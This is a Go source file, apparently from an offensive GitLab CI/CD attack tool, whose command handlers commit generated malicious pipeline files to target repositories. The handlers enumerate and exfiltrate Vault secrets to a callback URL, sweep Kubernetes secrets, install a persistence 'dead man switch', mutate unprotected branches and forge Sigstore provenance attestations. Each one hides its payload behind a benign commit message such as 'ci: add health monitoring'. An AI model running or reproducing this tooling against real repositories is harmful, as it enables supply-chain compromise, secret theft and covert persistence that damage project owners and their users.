package cmd

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/mr-pmillz/gogatoz/pkg/attack"
	payloadgen "github.com/mr-pmillz/gogatoz/pkg/attack/payloads"
	"github.com/mr-pmillz/gogatoz/pkg/gitlabx"
	"github.com/spf13/cobra"
)

// runAttackVaultEnum enumerates and exfiltrates HashiCorp Vault secrets.
func runAttackVaultEnum(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) error { //nolint:dupl // structurally similar to sigstore handler but different YAML generation and JSON output
	if strings.TrimSpace(atkBranch) == "" {
		atkBranch = "gogatoz-vault-enum"
	}
	if strings.TrimSpace(atkMessage) == "" {
		atkMessage = "ci: add vault integration checks"
	}
	yaml := payloadgen.GenerateVaultEnumYAML(payloadgen.VaultEnumOptions{
		Common: payloadgen.CommonOptions{
			JobName: strings.TrimSpace(atkJobName),
			Stage:   strings.TrimSpace(atkStage),
			Image:   strings.TrimSpace(atkImage),
			Tags:    parseTags(atkTags),
			Manual:  atkManual,
		},
		VaultAddr:   strings.TrimSpace(atkVaultAddr),
		AuthMethod:  strings.TrimSpace(atkVaultAuthMethod),
		CallbackURL: strings.TrimSpace(atkWebhook),
	})
	finalBranch, err := commitPayloadToBranch(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail, atkMessage, yaml)
	if err != nil {
		return fmt.Errorf("commit vault enum payload: %w", err)
	}
	fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed vault enum payload to branch %s\n", finalBranch)
	if outputJSON {
		out := struct {
			Branch     string `json:"branch"`
			VaultAddr  string `json:"vault_addr,omitempty"`
			AuthMethod string `json:"auth_method,omitempty"`
		}{
			Branch:     finalBranch,
			VaultAddr:  strings.TrimSpace(atkVaultAddr),
			AuthMethod: strings.TrimSpace(atkVaultAuthMethod),
		}
		b, _ := json.MarshalIndent(out, "", "  ")
		_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
		return err
	}
	renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Vault enum payload committed to branch %s", finalBranch))
	return nil
}

// runAttackK8sSecrets sweeps Kubernetes secrets via runner pod service account.
func runAttackK8sSecrets(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) error {
	if strings.TrimSpace(atkBranch) == "" {
		atkBranch = "gogatoz-k8s-secrets"
	}
	finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
	if berr != nil {
		return berr
	}
	att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
	if _, err := att.SetupUser(ctx); err != nil {
		return fmt.Errorf("setup user: %w", err)
	}
	if err := att.EnsureBranch(ctx, atkTarget, finalBranch); err != nil {
		return err
	}
	if strings.TrimSpace(atkMessage) == "" {
		atkMessage = "ci: add kubernetes integration tests"
	}
	var ns []string
	if s := strings.TrimSpace(atkK8sNamespaces); s != "" {
		for n := range strings.SplitSeq(s, ",") {
			n = strings.TrimSpace(n)
			if n != "" {
				ns = append(ns, n)
			}
		}
	}
	yaml := payloadgen.GenerateK8sSecretsYAML(payloadgen.K8sSecretsOptions{
		Common: payloadgen.CommonOptions{
			JobName: strings.TrimSpace(atkJobName),
			Stage:   strings.TrimSpace(atkStage),
			Image:   strings.TrimSpace(atkImage),
			Tags:    parseTags(atkTags),
			Manual:  atkManual,
		},
		Namespaces:  ns,
		CallbackURL: strings.TrimSpace(atkWebhook),
	})
	if err := att.UpsertFile(ctx, atkTarget, finalBranch, ".gitlab-ci.yml", yaml, atkMessage); err != nil {
		return fmt.Errorf("commit k8s secrets payload: %w", err)
	}
	fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed k8s secrets payload to branch %s\n", finalBranch)
	if outputJSON {
		out := struct {
			Branch     string   `json:"branch"`
			Namespaces []string `json:"namespaces,omitempty"`
		}{
			Branch:     finalBranch,
			Namespaces: ns,
		}
		b, _ := json.MarshalIndent(out, "", "  ")
		_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
		return err
	}
	renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("K8s secrets payload committed to branch %s", finalBranch))
	return nil
}

// runAttackDeadManSwitch installs persistence with token revocation detection.
func runAttackDeadManSwitch(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) error {
	if strings.TrimSpace(atkBranch) == "" {
		atkBranch = "gogatoz-dms"
	}
	finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
	if berr != nil {
		return berr
	}
	att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
	if _, err := att.SetupUser(ctx); err != nil {
		return fmt.Errorf("setup user: %w", err)
	}
	if err := att.EnsureBranch(ctx, atkTarget, finalBranch); err != nil {
		return err
	}
	if strings.TrimSpace(atkMessage) == "" {
		atkMessage = "ci: add health monitoring"
	}
	yaml := payloadgen.GenerateDeadManSwitchYAML(payloadgen.DeadManSwitchOptions{
		Common: payloadgen.CommonOptions{
			JobName: strings.TrimSpace(atkJobName),
			Stage:   strings.TrimSpace(atkStage),
			Image:   strings.TrimSpace(atkImage),
			Tags:    parseTags(atkTags),
			Manual:  atkManual,
		},
		MonitorURL:    deadManSwitchMonitorURL(atkDMSMonitorURL, gitlabURL),
		CheckInterval: strings.TrimSpace(atkDMSInterval),
		TTL:           strings.TrimSpace(atkDMSTTL),
		Handler:       strings.TrimSpace(atkDMSHandler),
		Platform:      strings.TrimSpace(atkDMSPlatform),
	})
	if err := att.UpsertFile(ctx, atkTarget, finalBranch, ".gitlab-ci.yml", yaml, atkMessage); err != nil {
		return fmt.Errorf("commit dead man switch payload: %w", err)
	}
	fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed dead man switch payload to branch %s\n", finalBranch)
	if outputJSON {
		out := struct {
			Branch   string `json:"branch"`
			Platform string `json:"platform,omitempty"`
			Handler  string `json:"handler,omitempty"`
		}{
			Branch:   finalBranch,
			Platform: strings.TrimSpace(atkDMSPlatform),
			Handler:  strings.TrimSpace(atkDMSHandler),
		}
		b, _ := json.MarshalIndent(out, "", "  ")
		_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
		return err
	}
	renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Dead Man's Switch payload committed to branch %s", finalBranch))
	return nil
}

func deadManSwitchMonitorURL(configuredURL, baseURL string) string {
	if configuredURL = strings.TrimSpace(configuredURL); configuredURL != "" {
		return configuredURL
	}
	return strings.TrimRight(strings.TrimSpace(baseURL), "/") + "/api/v4/user"
}

// runAttackBranchMutator iterates unprotected branches and commits a file to each.
func runAttackBranchMutator(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) error {
	content := strings.TrimSpace(atkMutatorContent)
	if content == "" {
		// Generate a default CI payload if no content provided
		ci, cerr := renderPayload()
		if cerr == nil && strings.TrimSpace(ci) != "" {
			content = ci
		}
	}
	if content == "" {
		content = "stages: [test]\nmutated:\n  stage: test\n  script: [echo mutated]\n"
	}
	maxBranches := atkMutatorMaxBranches
	if maxBranches <= 0 {
		maxBranches = 10
	}
	opts := payloadgen.BranchMutatorOptions{
		FilePath:    strings.TrimSpace(atkMutatorFile),
		FileContent: content,
		MaxBranches: maxBranches,
		CallbackURL: strings.TrimSpace(atkWebhook),
	}
	result := payloadgen.RunBranchMutator(ctx, client.GL, atkTarget, opts, atkAuthorName, atkAuthorEmail, cmd.ErrOrStderr())
	if outputJSON {
		b, _ := json.MarshalIndent(result, "", "  ")
		_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
		return err
	}
	renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Branch mutator: %d/%d branches mutated", result.Mutated, result.Targeted))
	if result.Errors > 0 {
		renderWarning(cmd.OutOrStdout(), fmt.Sprintf("%d errors encountered", result.Errors))
	}
	return nil
}

// runAttackSigstore forges Sigstore provenance attestations.
func runAttackSigstore(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) error { //nolint:dupl // structurally similar to vault-enum handler but different YAML generation and JSON output
	if strings.TrimSpace(atkBranch) == "" {
		atkBranch = "gogatoz-sigstore"
	}
	if strings.TrimSpace(atkMessage) == "" {
		atkMessage = "ci: add provenance attestation"
	}
	yaml := payloadgen.GenerateSigstoreYAML(payloadgen.SigstoreOptions{
		Common: payloadgen.CommonOptions{
			JobName: strings.TrimSpace(atkJobName),
			Stage:   strings.TrimSpace(atkStage),
			Image:   strings.TrimSpace(atkImage),
			Tags:    parseTags(atkTags),
			Manual:  atkManual,
		},
		PackageName: strings.TrimSpace(atkSigstorePackage),
		Version:     strings.TrimSpace(atkSigstoreVersion),
		CallbackURL: strings.TrimSpace(atkWebhook),
	})
	finalBranch, err := commitPayloadToBranch(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail, atkMessage, yaml)
	if err != nil {
		return fmt.Errorf("commit sigstore payload: %w", err)
	}
	fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed sigstore provenance payload to branch %s\n", finalBranch)
	if outputJSON {
		out := struct {
			Branch      string `json:"branch"`
			PackageName string `json:"package_name,omitempty"`
			Version     string `json:"version,omitempty"`
		}{
			Branch:      finalBranch,
			PackageName: strings.TrimSpace(atkSigstorePackage),
			Version:     strings.TrimSpace(atkSigstoreVersion),
		}
		b, _ := json.MarshalIndent(out, "", "  ")
		_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
		return err
	}
	renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Sigstore provenance payload committed to branch %s", finalBranch))
	return nil
}
